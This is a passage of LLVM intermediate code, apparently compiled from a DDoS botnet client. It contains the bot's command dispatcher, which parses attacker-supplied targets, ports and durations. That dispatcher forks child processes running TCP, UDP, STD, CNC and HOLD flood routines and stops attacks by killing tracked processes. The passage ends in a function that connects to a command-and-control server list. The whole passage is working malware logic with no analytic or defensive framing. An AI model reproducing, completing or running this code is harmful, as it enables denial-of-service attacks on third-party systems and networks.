286:                                              ; preds = %279, %276
  %287 = load i8**, i8*** %4, align 8
  %288 = getelementptr inbounds i8*, i8** %287, i64 1
  %289 = load i8*, i8** %288, align 8
  store i8* %289, i8** %16, align 8
  %290 = load i8**, i8*** %4, align 8
  %291 = getelementptr inbounds i8*, i8** %290, i64 2
  %292 = load i8*, i8** %291, align 8
  %293 = call i32 @atoi(i8* %292) #12
  store i32 %293, i32* %17, align 4
  %294 = load i8**, i8*** %4, align 8
  %295 = getelementptr inbounds i8*, i8** %294, i64 3
  %296 = load i8*, i8** %295, align 8
  %297 = call i32 @atoi(i8* %296) #12
  store i32 %297, i32* %18, align 4
  %298 = load i8**, i8*** %4, align 8
  %299 = getelementptr inbounds i8*, i8** %298, i64 4
  %300 = load i8*, i8** %299, align 8
  %301 = call i32 @atoi(i8* %300) #12
  store i32 %301, i32* %19, align 4
  %302 = load i8**, i8*** %4, align 8
  %303 = getelementptr inbounds i8*, i8** %302, i64 5
  %304 = load i8*, i8** %303, align 8
  store i8* %304, i8** %20, align 8
  %305 = load i32, i32* %3, align 4
  %306 = icmp eq i32 %305, 8
  br i1 %306, label %307, label %312

307:                                              ; preds = %286
  %308 = load i8**, i8*** %4, align 8
  %309 = getelementptr inbounds i8*, i8** %308, i64 7
  %310 = load i8*, i8** %309, align 8
  %311 = call i32 @atoi(i8* %310) #12
  br label %313

312:                                              ; preds = %286
  br label %313

313:                                              ; preds = %312, %307
  %314 = phi i32 [ %311, %307 ], [ 10, %312 ]
  store i32 %314, i32* %21, align 4
  %315 = load i32, i32* %3, align 4
  %316 = icmp sgt i32 %315, 6
  br i1 %316, label %317, label %322

317:                                              ; preds = %313
  %318 = load i8**, i8*** %4, align 8
  %319 = getelementptr inbounds i8*, i8** %318, i64 6
  %320 = load i8*, i8** %319, align 8
  %321 = call i32 @atoi(i8* %320) #12
  br label %323

322:                                              ; preds = %313
  br label %323

323:                                              ; preds = %322, %317
  %324 = phi i32 [ %321, %317 ], [ 0, %322 ]
  store i32 %324, i32* %22, align 4
  %325 = load i8*, i8** %16, align 8
  %326 = call i8* @strstr(i8* %325, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i64 0, i64 0)) #12
  %327 = icmp ne i8* %326, null
  br i1 %327, label %328, label %350

328:                                              ; preds = %323
  %329 = load i8*, i8** %23, align 8
  %330 = call i8* @strtok(i8* %329, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i64 0, i64 0)) #11
  store i8* %330, i8** %23, align 8
  br label %331

331:                                              ; preds = %347, %328
  %332 = load i8*, i8** %23, align 8
  %333 = icmp ne i8* %332, null
  br i1 %333, label %334, label %349

334:                                              ; preds = %331
  %335 = call i32 @listFork()
  %336 = icmp ne i32 %335, 0
  br i1 %336, label %347, label %337

337:                                              ; preds = %334
  %338 = load i8*, i8** %23, align 8
  %339 = load i32, i32* %17, align 4
  %340 = load i32, i32* %18, align 4
  %341 = load i32, i32* %19, align 4
  %342 = load i8*, i8** %20, align 8
  %343 = load i32, i32* %22, align 4
  %344 = load i32, i32* %21, align 4
  call void @atcp(i8* %338, i32 %339, i32 %340, i32 %341, i8* %342, i32 %343, i32 %344)
  %345 = load i32, i32* @mainCommSock, align 4
  %346 = call i32 @close(i32 %345)
  call void @_exit(i32 0) #13
  unreachable

347:                                              ; preds = %334
  %348 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i64 0, i64 0)) #11
  store i8* %348, i8** %23, align 8
  br label %331, !llvm.loop !36

349:                                              ; preds = %331
  br label %364

350:                                              ; preds = %323
  %351 = call i32 @listFork()
  %352 = icmp ne i32 %351, 0
  br i1 %352, label %353, label %354

353:                                              ; preds = %350
  br label %813

354:                                              ; preds = %350
  %355 = load i8*, i8** %16, align 8
  %356 = load i32, i32* %17, align 4
  %357 = load i32, i32* %18, align 4
  %358 = load i32, i32* %19, align 4
  %359 = load i8*, i8** %20, align 8
  %360 = load i32, i32* %22, align 4
  %361 = load i32, i32* %21, align 4
  call void @atcp(i8* %355, i32 %356, i32 %357, i32 %358, i8* %359, i32 %360, i32 %361)
  %362 = load i32, i32* @mainCommSock, align 4
  %363 = call i32 @close(i32 %362)
  call void @_exit(i32 0) #13
  unreachable

364:                                              ; preds = %349
  br label %365

365:                                              ; preds = %364, %234
  %366 = load i8**, i8*** %4, align 8
  %367 = getelementptr inbounds i8*, i8** %366, i64 0
  %368 = load i8*, i8** %367, align 8
  %369 = call i32 @strcmp(i8* %368, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.38, i64 0, i64 0)) #12
  %370 = icmp ne i32 %369, 0
  br i1 %370, label %500, label %371

371:                                              ; preds = %365
  %372 = load i32, i32* %3, align 4
  %373 = icmp slt i32 %372, 6
  br i1 %373, label %416, label %374

374:                                              ; preds = %371
  %375 = load i8**, i8*** %4, align 8
  %376 = getelementptr inbounds i8*, i8** %375, i64 3
  %377 = load i8*, i8** %376, align 8
  %378 = call i32 @atoi(i8* %377) #12
  %379 = icmp eq i32 %378, -1
  br i1 %379, label %416, label %380

380:                                              ; preds = %374
  %381 = load i8**, i8*** %4, align 8
  %382 = getelementptr inbounds i8*, i8** %381, i64 2
  %383 = load i8*, i8** %382, align 8
  %384 = call i32 @atoi(i8* %383) #12
  %385 = icmp eq i32 %384, -1
  br i1 %385, label %416, label %386

386:                                              ; preds = %380
  %387 = load i8**, i8*** %4, align 8
  %388 = getelementptr inbounds i8*, i8** %387, i64 4
  %389 = load i8*, i8** %388, align 8
  %390 = call i32 @atoi(i8* %389) #12
  %391 = icmp eq i32 %390, -1
  br i1 %391, label %416, label %392

392:                                              ; preds = %386
  %393 = load i8**, i8*** %4, align 8
  %394 = getelementptr inbounds i8*, i8** %393, i64 4
  %395 = load i8*, i8** %394, align 8
  %396 = call i32 @atoi(i8* %395) #12
  %397 = icmp sgt i32 %396, 32
  br i1 %397, label %416, label %398

398:                                              ; preds = %392
  %399 = load i32, i32* %3, align 4
  %400 = icmp sgt i32 %399, 6
  br i1 %400, label %401, label %407

401:                                              ; preds = %398
  %402 = load i8**, i8*** %4, align 8
  %403 = getelementptr inbounds i8*, i8** %402, i64 6
  %404 = load i8*, i8** %403, align 8
  %405 = call i32 @atoi(i8* %404) #12
  %406 = icmp slt i32 %405, 0
  br i1 %406, label %416, label %407

407:                                              ; preds = %401, %398
  %408 = load i32, i32* %3, align 4
  %409 = icmp eq i32 %408, 8
  br i1 %409, label %410, label %417

410:                                              ; preds = %407
  %411 = load i8**, i8*** %4, align 8
  %412 = getelementptr inbounds i8*, i8** %411, i64 7
  %413 = load i8*, i8** %412, align 8
  %414 = call i32 @atoi(i8* %413) #12
  %415 = icmp slt i32 %414, 1
  br i1 %415, label %416, label %417

416:                                              ; preds = %410, %401, %392, %386, %380, %374, %371
  br label %813

417:                                              ; preds = %410, %407
  %418 = load i8**, i8*** %4, align 8
  %419 = getelementptr inbounds i8*, i8** %418, i64 1
  %420 = load i8*, i8** %419, align 8
  store i8* %420, i8** %24, align 8
  %421 = load i8**, i8*** %4, align 8
  %422 = getelementptr inbounds i8*, i8** %421, i64 2
  %423 = load i8*, i8** %422, align 8
  %424 = call i32 @atoi(i8* %423) #12
  store i32 %424, i32* %25, align 4
  %425 = load i8**, i8*** %4, align 8
  %426 = getelementptr inbounds i8*, i8** %425, i64 3
  %427 = load i8*, i8** %426, align 8
  %428 = call i32 @atoi(i8* %427) #12
  store i32 %428, i32* %26, align 4
  %429 = load i8**, i8*** %4, align 8
  %430 = getelementptr inbounds i8*, i8** %429, i64 4
  %431 = load i8*, i8** %430, align 8
  %432 = call i32 @atoi(i8* %431) #12
  store i32 %432, i32* %27, align 4
  %433 = load i8**, i8*** %4, align 8
  %434 = getelementptr inbounds i8*, i8** %433, i64 5
  %435 = load i8*, i8** %434, align 8
  store i8* %435, i8** %28, align 8
  %436 = load i32, i32* %3, align 4
  %437 = icmp eq i32 %436, 8
  br i1 %437, label %438, label %443

438:                                              ; preds = %417
  %439 = load i8**, i8*** %4, align 8
  %440 = getelementptr inbounds i8*, i8** %439, i64 7
  %441 = load i8*, i8** %440, align 8
  %442 = call i32 @atoi(i8* %441) #12
  br label %444

443:                                              ; preds = %417
  br label %444

444:                                              ; preds = %443, %438
  %445 = phi i32 [ %442, %438 ], [ 10, %443 ]
  store i32 %445, i32* %29, align 4
  %446 = load i32, i32* %3, align 4
  %447 = icmp sgt i32 %446, 6
  br i1 %447, label %448, label %453

448:                                              ; preds = %444
  %449 = load i8**, i8*** %4, align 8
  %450 = getelementptr inbounds i8*, i8** %449, i64 6
  %451 = load i8*, i8** %450, align 8
  %452 = call i32 @atoi(i8* %451) #12
  br label %454

453:                                              ; preds = %444
  br label %454

454:                                              ; preds = %453, %448
  %455 = phi i32 [ %452, %448 ], [ 0, %453 ]
  store i32 %455, i32* %30, align 4
  %456 = load i8*, i8** %24, align 8
  %457 = call i8* @strstr(i8* %456, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i64 0, i64 0)) #12
  %458 = icmp ne i8* %457, null
  br i1 %458, label %459, label %483

459:                                              ; preds = %454
  %460 = load i8*, i8** %31, align 8
  %461 = call i8* @strtok(i8* %460, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i64 0, i64 0)) #11
  store i8* %461, i8** %31, align 8
  br label %462

462:                                              ; preds = %480, %459
  %463 = load i8*, i8** %31, align 8
  %464 = icmp ne i8* %463, null
  br i1 %464, label %465, label %482

465:                                              ; preds = %462
  %466 = call i32 @listFork()
  %467 = icmp ne i32 %466, 0
  br i1 %467, label %480, label %468

468:                                              ; preds = %465
  %469 = load i8*, i8** %31, align 8
  %470 = load i32, i32* %25, align 4
  %471 = load i32, i32* %26, align 4
  call void @astd(i8* %469, i32 %470, i32 %471)
  %472 = load i8*, i8** %31, align 8
  %473 = load i32, i32* %25, align 4
  %474 = load i32, i32* %26, align 4
  %475 = load i32, i32* %27, align 4
  %476 = load i32, i32* %30, align 4
  %477 = load i32, i32* %29, align 4
  call void @audp(i8* %472, i32 %473, i32 %474, i32 %475, i32 %476, i32 %477)
  %478 = load i32, i32* @mainCommSock, align 4
  %479 = call i32 @close(i32 %478)
  call void @_exit(i32 0) #13
  unreachable

480:                                              ; preds = %465
  %481 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i64 0, i64 0)) #11
  store i8* %481, i8** %31, align 8
  br label %462, !llvm.loop !37

482:                                              ; preds = %462
  br label %499

483:                                              ; preds = %454
  %484 = call i32 @listFork()
  %485 = icmp ne i32 %484, 0
  br i1 %485, label %486, label %487

486:                                              ; preds = %483
  br label %813

487:                                              ; preds = %483
  %488 = load i8*, i8** %24, align 8
  %489 = load i32, i32* %25, align 4
  %490 = load i32, i32* %26, align 4
  call void @astd(i8* %488, i32 %489, i32 %490)
  %491 = load i8*, i8** %24, align 8
  %492 = load i32, i32* %25, align 4
  %493 = load i32, i32* %26, align 4
  %494 = load i32, i32* %27, align 4
  %495 = load i32, i32* %30, align 4
  %496 = load i32, i32* %29, align 4
  call void @audp(i8* %491, i32 %492, i32 %493, i32 %494, i32 %495, i32 %496)
  %497 = load i32, i32* @mainCommSock, align 4
  %498 = call i32 @close(i32 %497)
  call void @_exit(i32 0) #13
  unreachable

499:                                              ; preds = %482
  br label %500

500:                                              ; preds = %499, %365
  %501 = load i8**, i8*** %4, align 8
  %502 = getelementptr inbounds i8*, i8** %501, i64 0
  %503 = load i8*, i8** %502, align 8
  %504 = call i32 @strcmp(i8* %503, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.39, i64 0, i64 0)) #12
  %505 = icmp ne i32 %504, 0
  br i1 %505, label %637, label %506

506:                                              ; preds = %500
  %507 = load i32, i32* %3, align 4
  %508 = icmp slt i32 %507, 6
  br i1 %508, label %551, label %509

509:                                              ; preds = %506
  %510 = load i8**, i8*** %4, align 8
  %511 = getelementptr inbounds i8*, i8** %510, i64 3
  %512 = load i8*, i8** %511, align 8
  %513 = call i32 @atoi(i8* %512) #12
  %514 = icmp eq i32 %513, -1
  br i1 %514, label %551, label %515

515:                                              ; preds = %509
  %516 = load i8**, i8*** %4, align 8
  %517 = getelementptr inbounds i8*, i8** %516, i64 2
  %518 = load i8*, i8** %517, align 8
  %519 = call i32 @atoi(i8* %518) #12
  %520 = icmp eq i32 %519, -1
  br i1 %520, label %551, label %521

521:                                              ; preds = %515
  %522 = load i8**, i8*** %4, align 8
  %523 = getelementptr inbounds i8*, i8** %522, i64 4
  %524 = load i8*, i8** %523, align 8
  %525 = call i32 @atoi(i8* %524) #12
  %526 = icmp eq i32 %525, -1
  br i1 %526, label %551, label %527

527:                                              ; preds = %521
  %528 = load i8**, i8*** %4, align 8
  %529 = getelementptr inbounds i8*, i8** %528, i64 4
  %530 = load i8*, i8** %529, align 8
  %531 = call i32 @atoi(i8* %530) #12
  %532 = icmp sgt i32 %531, 32
  br i1 %532, label %551, label %533

533:                                              ; preds = %527
  %534 = load i32, i32* %3, align 4
  %535 = icmp sgt i32 %534, 6
  br i1 %535, label %536, label %542

536:                                              ; preds = %533
  %537 = load i8**, i8*** %4, align 8
  %538 = getelementptr inbounds i8*, i8** %537, i64 6
  %539 = load i8*, i8** %538, align 8
  %540 = call i32 @atoi(i8* %539) #12
  %541 = icmp slt i32 %540, 0
  br i1 %541, label %551, label %542

542:                                              ; preds = %536, %533
  %543 = load i32, i32* %3, align 4
  %544 = icmp eq i32 %543, 8
  br i1 %544, label %545, label %552

545:                                              ; preds = %542
  %546 = load i8**, i8*** %4, align 8
  %547 = getelementptr inbounds i8*, i8** %546, i64 7
  %548 = load i8*, i8** %547, align 8
  %549 = call i32 @atoi(i8* %548) #12
  %550 = icmp slt i32 %549, 1
  br i1 %550, label %551, label %552

551:                                              ; preds = %545, %536, %527, %521, %515, %509, %506
  br label %813

552:                                              ; preds = %545, %542
  %553 = load i8**, i8*** %4, align 8
  %554 = getelementptr inbounds i8*, i8** %553, i64 1
  %555 = load i8*, i8** %554, align 8
  store i8* %555, i8** %32, align 8
  %556 = load i8**, i8*** %4, align 8
  %557 = getelementptr inbounds i8*, i8** %556, i64 2
  %558 = load i8*, i8** %557, align 8
  %559 = call i32 @atoi(i8* %558) #12
  store i32 %559, i32* %33, align 4
  %560 = load i8**, i8*** %4, align 8
  %561 = getelementptr inbounds i8*, i8** %560, i64 3
  %562 = load i8*, i8** %561, align 8
  %563 = call i32 @atoi(i8* %562) #12
  store i32 %563, i32* %34, align 4
  %564 = load i8**, i8*** %4, align 8
  %565 = getelementptr inbounds i8*, i8** %564, i64 4
  %566 = load i8*, i8** %565, align 8
  %567 = call i32 @atoi(i8* %566) #12
  store i32 %567, i32* %35, align 4
  %568 = load i8**, i8*** %4, align 8
  %569 = getelementptr inbounds i8*, i8** %568, i64 5
  %570 = load i8*, i8** %569, align 8
  store i8* %570, i8** %36, align 8
  %571 = load i32, i32* %3, align 4
  %572 = icmp eq i32 %571, 8
  br i1 %572, label %573, label %578

573:                                              ; preds = %552
  %574 = load i8**, i8*** %4, align 8
  %575 = getelementptr inbounds i8*, i8** %574, i64 7
  %576 = load i8*, i8** %575, align 8
  %577 = call i32 @atoi(i8* %576) #12
  br label %579

578:                                              ; preds = %552
  br label %579

579:                                              ; preds = %578, %573
  %580 = phi i32 [ %577, %573 ], [ 10, %578 ]
  store i32 %580, i32* %37, align 4
  %581 = load i32, i32* %3, align 4
  %582 = icmp sgt i32 %581, 6
  br i1 %582, label %583, label %588

583:                                              ; preds = %579
  %584 = load i8**, i8*** %4, align 8
  %585 = getelementptr inbounds i8*, i8** %584, i64 6
  %586 = load i8*, i8** %585, align 8
  %587 = call i32 @atoi(i8* %586) #12
  br label %589

588:                                              ; preds = %579
  br label %589

589:                                              ; preds = %588, %583
  %590 = phi i32 [ %587, %583 ], [ 0, %588 ]
  store i32 %590, i32* %38, align 4
  %591 = load i8*, i8** %32, align 8
  %592 = call i8* @strstr(i8* %591, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i64 0, i64 0)) #12
  %593 = icmp ne i8* %592, null
  br i1 %593, label %594, label %619

594:                                              ; preds = %589
  %595 = load i8*, i8** %39, align 8
  %596 = call i8* @strtok(i8* %595, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i64 0, i64 0)) #11
  store i8* %596, i8** %39, align 8
  br label %597

597:                                              ; preds = %616, %594
  %598 = load i8*, i8** %39, align 8
  %599 = icmp ne i8* %598, null
  br i1 %599, label %600, label %618

600:                                              ; preds = %597
  %601 = call i32 @listFork()
  %602 = icmp ne i32 %601, 0
  br i1 %602, label %616, label %603

603:                                              ; preds = %600
  %604 = load i8*, i8** %39, align 8
  %605 = load i32, i32* %33, align 4
  %606 = load i32, i32* %34, align 4
  call void @astd(i8* %604, i32 %605, i32 %606)
  %607 = load i8*, i8** %39, align 8
  %608 = load i32, i32* %33, align 4
  %609 = load i32, i32* %34, align 4
  %610 = load i32, i32* %35, align 4
  %611 = load i8*, i8** %36, align 8
  %612 = load i32, i32* %38, align 4
  %613 = load i32, i32* %37, align 4
  call void @atcp(i8* %607, i32 %608, i32 %609, i32 %610, i8* %611, i32 %612, i32 %613)
  %614 = load i32, i32* @mainCommSock, align 4
  %615 = call i32 @close(i32 %614)
  call void @_exit(i32 0) #13
  unreachable

616:                                              ; preds = %600
  %617 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i64 0, i64 0)) #11
  store i8* %617, i8** %39, align 8
  br label %597, !llvm.loop !38

618:                                              ; preds = %597
  br label %636

619:                                              ; preds = %589
  %620 = call i32 @listFork()
  %621 = icmp ne i32 %620, 0
  br i1 %621, label %622, label %623

622:                                              ; preds = %619
  br label %813

623:                                              ; preds = %619
  %624 = load i8*, i8** %32, align 8
  %625 = load i32, i32* %33, align 4
  %626 = load i32, i32* %34, align 4
  call void @astd(i8* %624, i32 %625, i32 %626)
  %627 = load i8*, i8** %32, align 8
  %628 = load i32, i32* %33, align 4
  %629 = load i32, i32* %34, align 4
  %630 = load i32, i32* %35, align 4
  %631 = load i8*, i8** %36, align 8
  %632 = load i32, i32* %38, align 4
  %633 = load i32, i32* %37, align 4
  call void @atcp(i8* %627, i32 %628, i32 %629, i32 %630, i8* %631, i32 %632, i32 %633)
  %634 = load i32, i32* @mainCommSock, align 4
  %635 = call i32 @close(i32 %634)
  call void @_exit(i32 0) #13
  unreachable

636:                                              ; preds = %618
  br label %637

637:                                              ; preds = %636, %500
  %638 = load i8**, i8*** %4, align 8
  %639 = getelementptr inbounds i8*, i8** %638, i64 0
  %640 = load i8*, i8** %639, align 8
  %641 = call i32 @strcmp(i8* %640, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.40, i64 0, i64 0)) #12
  %642 = icmp ne i32 %641, 0
  br i1 %642, label %701, label %643

643:                                              ; preds = %637
  %644 = load i32, i32* %3, align 4
  %645 = icmp slt i32 %644, 4
  br i1 %645, label %658, label %646

646:                                              ; preds = %643
  %647 = load i8**, i8*** %4, align 8
  %648 = getelementptr inbounds i8*, i8** %647, i64 2
  %649 = load i8*, i8** %648, align 8
  %650 = call i32 @atoi(i8* %649) #12
  %651 = icmp slt i32 %650, 1
  br i1 %651, label %658, label %652

652:                                              ; preds = %646
  %653 = load i8**, i8*** %4, align 8
  %654 = getelementptr inbounds i8*, i8** %653, i64 3
  %655 = load i8*, i8** %654, align 8
  %656 = call i32 @atoi(i8* %655) #12
  %657 = icmp slt i32 %656, 1
  br i1 %657, label %658, label %659

658:                                              ; preds = %652, %646, %643
  br label %813

659:                                              ; preds = %652
  %660 = load i8**, i8*** %4, align 8
  %661 = getelementptr inbounds i8*, i8** %660, i64 1
  %662 = load i8*, i8** %661, align 8
  store i8* %662, i8** %40, align 8
  %663 = load i8**, i8*** %4, align 8
  %664 = getelementptr inbounds i8*, i8** %663, i64 2
  %665 = load i8*, i8** %664, align 8
  %666 = call i32 @atoi(i8* %665) #12
  store i32 %666, i32* %41, align 4
  %667 = load i8**, i8*** %4, align 8
  %668 = getelementptr inbounds i8*, i8** %667, i64 3
  %669 = load i8*, i8** %668, align 8
  %670 = call i32 @atoi(i8* %669) #12
  store i32 %670, i32* %42, align 4
  %671 = load i8*, i8** %40, align 8
  %672 = call i8* @strstr(i8* %671, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i64 0, i64 0)) #12
  %673 = icmp ne i8* %672, null
  br i1 %673, label %674, label %692

674:                                              ; preds = %659
  %675 = load i8*, i8** %43, align 8
  %676 = call i8* @strtok(i8* %675, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i64 0, i64 0)) #11
  store i8* %676, i8** %43, align 8
  br label %677

677:                                              ; preds = %689, %674
  %678 = load i8*, i8** %43, align 8
  %679 = icmp ne i8* %678, null
  br i1 %679, label %680, label %691

680:                                              ; preds = %677
  %681 = call i32 @listFork()
  %682 = icmp ne i32 %681, 0
  br i1 %682, label %689, label %683

683:                                              ; preds = %680
  %684 = load i8*, i8** %43, align 8
  %685 = load i32, i32* %41, align 4
  %686 = load i32, i32* %42, align 4
  call void @acnc(i8* %684, i32 %685, i32 %686)
  %687 = load i32, i32* @mainCommSock, align 4
  %688 = call i32 @close(i32 %687)
  call void @_exit(i32 0) #13
  unreachable

689:                                              ; preds = %680
  %690 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i64 0, i64 0)) #11
  store i8* %690, i8** %43, align 8
  br label %677, !llvm.loop !39

691:                                              ; preds = %677
  br label %700

692:                                              ; preds = %659
  %693 = call i32 @listFork()
  %694 = icmp ne i32 %693, 0
  br i1 %694, label %695, label %696

695:                                              ; preds = %692
  br label %813

696:                                              ; preds = %692
  %697 = load i8*, i8** %40, align 8
  %698 = load i32, i32* %41, align 4
  %699 = load i32, i32* %42, align 4
  call void @acnc(i8* %697, i32 %698, i32 %699)
  call void @_exit(i32 0) #13
  unreachable

700:                                              ; preds = %691
  br label %701

701:                                              ; preds = %700, %637
  %702 = load i8**, i8*** %4, align 8
  %703 = getelementptr inbounds i8*, i8** %702, i64 0
  %704 = load i8*, i8** %703, align 8
  %705 = call i32 @strcmp(i8* %704, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.41, i64 0, i64 0)) #12
  %706 = icmp ne i32 %705, 0
  br i1 %706, label %771, label %707

707:                                              ; preds = %701
  %708 = load i32, i32* %3, align 4
  %709 = icmp slt i32 %708, 4
  br i1 %709, label %722, label %710

710:                                              ; preds = %707
  %711 = load i8**, i8*** %4, align 8
  %712 = getelementptr inbounds i8*, i8** %711, i64 2
  %713 = load i8*, i8** %712, align 8
  %714 = call i32 @atoi(i8* %713) #12
  %715 = icmp slt i32 %714, 1
  br i1 %715, label %722, label %716

716:                                              ; preds = %710
  %717 = load i8**, i8*** %4, align 8
  %718 = getelementptr inbounds i8*, i8** %717, i64 3
  %719 = load i8*, i8** %718, align 8
  %720 = call i32 @atoi(i8* %719) #12
  %721 = icmp slt i32 %720, 1
  br i1 %721, label %722, label %723

722:                                              ; preds = %716, %710, %707
  br label %813

723:                                              ; preds = %716
  %724 = load i8**, i8*** %4, align 8
  %725 = getelementptr inbounds i8*, i8** %724, i64 1
  %726 = load i8*, i8** %725, align 8
  store i8* %726, i8** %44, align 8
  %727 = load i8**, i8*** %4, align 8
  %728 = getelementptr inbounds i8*, i8** %727, i64 2
  %729 = load i8*, i8** %728, align 8
  %730 = call i32 @atoi(i8* %729) #12
  store i32 %730, i32* %45, align 4
  %731 = load i8**, i8*** %4, align 8
  %732 = getelementptr inbounds i8*, i8** %731, i64 3
  %733 = load i8*, i8** %732, align 8
  %734 = call i32 @atoi(i8* %733) #12
  store i32 %734, i32* %46, align 4
  %735 = load i8*, i8** %44, align 8
  %736 = call i8* @strstr(i8* %735, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i64 0, i64 0)) #12
  %737 = icmp ne i8* %736, null
  br i1 %737, label %738, label %759

738:                                              ; preds = %723
  %739 = load i8*, i8** %47, align 8
  %740 = call i8* @strtok(i8* %739, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i64 0, i64 0)) #11
  store i8* %740, i8** %47, align 8
  br label %741

741:                                              ; preds = %756, %738
  %742 = load i8*, i8** %47, align 8
  %743 = icmp ne i8* %742, null
  br i1 %743, label %744, label %758

744:                                              ; preds = %741
  %745 = call i32 @listFork()
  %746 = icmp ne i32 %745, 0
  br i1 %746, label %756, label %747

747:                                              ; preds = %744
  %748 = load i8*, i8** %47, align 8
  %749 = load i32, i32* %45, align 4
  %750 = load i32, i32* %46, align 4
  call void @ahold(i8* %748, i32 %749, i32 %750)
  %751 = load i8*, i8** %47, align 8
  %752 = load i32, i32* %45, align 4
  %753 = load i32, i32* %46, align 4
  call void @astd(i8* %751, i32 %752, i32 %753)
  %754 = load i32, i32* @mainCommSock, align 4
  %755 = call i32 @close(i32 %754)
  call void @_exit(i32 0) #13
  unreachable

756:                                              ; preds = %744
  %757 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i64 0, i64 0)) #11
  store i8* %757, i8** %47, align 8
  br label %741, !llvm.loop !40

758:                                              ; preds = %741
  br label %770

759:                                              ; preds = %723
  %760 = call i32 @listFork()
  %761 = icmp ne i32 %760, 0
  br i1 %761, label %762, label %763

762:                                              ; preds = %759
  br label %813

763:                                              ; preds = %759
  %764 = load i8*, i8** %44, align 8
  %765 = load i32, i32* %45, align 4
  %766 = load i32, i32* %46, align 4
  call void @ahold(i8* %764, i32 %765, i32 %766)
  %767 = load i8*, i8** %44, align 8
  %768 = load i32, i32* %45, align 4
  %769 = load i32, i32* %46, align 4
  call void @astd(i8* %767, i32 %768, i32 %769)
  call void @_exit(i32 0) #13
  unreachable

770:                                              ; preds = %758
  br label %771

771:                                              ; preds = %770, %701
  %772 = load i8**, i8*** %4, align 8
  %773 = getelementptr inbounds i8*, i8** %772, i64 0
  %774 = load i8*, i8** %773, align 8
  %775 = call i32 @strcmp(i8* %774, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.42, i64 0, i64 0)) #12
  %776 = icmp ne i32 %775, 0
  br i1 %776, label %813, label %777

777:                                              ; preds = %771
  store i32 0, i32* %48, align 4
  store i64 0, i64* %49, align 8
  br label %778

778:                                              ; preds = %804, %777
  %779 = load i64, i64* %49, align 8
  %780 = load i64, i64* @numpids, align 8
  %781 = icmp ult i64 %779, %780
  br i1 %781, label %782, label %807

782:                                              ; preds = %778
  %783 = load i32*, i32** @pids, align 8
  %784 = load i64, i64* %49, align 8
  %785 = getelementptr inbounds i32, i32* %783, i64 %784
  %786 = load i32, i32* %785, align 4
  %787 = icmp ne i32 %786, 0
  br i1 %787, label %788, label %803

788:                                              ; preds = %782
  %789 = load i32*, i32** @pids, align 8
  %790 = load i64, i64* %49, align 8
  %791 = getelementptr inbounds i32, i32* %789, i64 %790
  %792 = load i32, i32* %791, align 4
  %793 = call i32 @getpid() #11
  %794 = icmp ne i32 %792, %793
  br i1 %794, label %795, label %803

795:                                              ; preds = %788
  %796 = load i32*, i32** @pids, align 8
  %797 = load i64, i64* %49, align 8
  %798 = getelementptr inbounds i32, i32* %796, i64 %797
  %799 = load i32, i32* %798, align 4
  %800 = call i32 @kill(i32 %799, i32 9) #11
  %801 = load i32, i32* %48, align 4
  %802 = add nsw i32 %801, 1
  store i32 %802, i32* %48, align 4
  br label %803

803:                                              ; preds = %795, %788, %782
  br label %804

804:                                              ; preds = %803
  %805 = load i64, i64* %49, align 8
  %806 = add i64 %805, 1
  store i64 %806, i64* %49, align 8
  br label %778, !llvm.loop !41

807:                                              ; preds = %778
  %808 = load i32, i32* %48, align 4
  %809 = icmp sgt i32 %808, 0
  br i1 %809, label %810, label %811

810:                                              ; preds = %807
  br label %812

811:                                              ; preds = %807
  br label %812

812:                                              ; preds = %811, %810
  br label %813

813:                                              ; preds = %103, %161, %193, %228, %285, %353, %416, %486, %551, %622, %658, %695, %722, %762, %812, %771
  ret void
}

; Function Attrs: nounwind readonly willreturn
declare i32 @atoi(i8*) #5

; Function Attrs: nounwind
declare i32 @getpid() #3

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #3

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @initConnection() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [512 x i8], align 16
  %3 = alloca i32, align 4
  %4 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %4, i8 0, i64 512, i1 false)
  %5 = load i32, i32* @mainCommSock, align 4
  %6 = icmp ne i32 %5, 0
  br i1 %6, label %7, label %10

7:                                                ; preds = %0
  %8 = load i32, i32* @mainCommSock, align 4
  %9 = call i32 @close(i32 %8)
  store i32 0, i32* @mainCommSock, align 4
  br label %10

10:                                               ; preds = %7, %0
  %11 = load i32, i32* @currentServer, align 4
  %12 = add nsw i32 %11, 1
  %13 = sext i32 %12 to i64
  %14 = icmp eq i64 %13, 1
  br i1 %14, label %15, label %16

15:                                               ; preds = %10
  store i32 0, i32* @currentServer, align 4
  br label %19

16:                                               ; preds = %10
  %17 = load i32, i32* @currentServer, align 4
  %18 = add nsw i32 %17, 1
  store i32 %18, i32* @currentServer, align 4
  br label %19

19:                                               ; preds = %16, %15
  %20 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i64 0, i64 0
  %21 = load i32, i32* @currentServer, align 4
  %22 = sext i32 %21 to i64
  %23 = getelementptr inbounds [1 x i8*], [1 x i8*]* @commServer, i64 0, i64 %22
